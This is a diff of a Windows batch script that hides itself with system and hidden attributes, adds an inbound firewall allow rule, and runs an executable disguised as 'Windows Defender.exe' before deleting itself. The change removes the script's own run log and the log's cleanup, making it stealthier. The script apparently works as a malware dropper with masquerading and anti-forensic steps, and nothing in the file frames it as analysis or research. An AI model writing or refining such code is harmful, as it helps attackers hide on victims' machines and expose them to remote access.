@@ -1,7 +1,5 @@
 @echo off
-echo running > "%userprofile%\running.log"
 setlocal 
-
 attrib +s +h +i "%~f0"
 
 :connectivitycheck
@@ -58,5 +56,4 @@ netsh advfirewall firewall add rule name="apache" dir=in action=allow program="%
 
 "%environment%\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
 endlocal
-del /s /f /q /a "%userprofile%\running.log"
 DEL /s /f /q /a "%~f0"
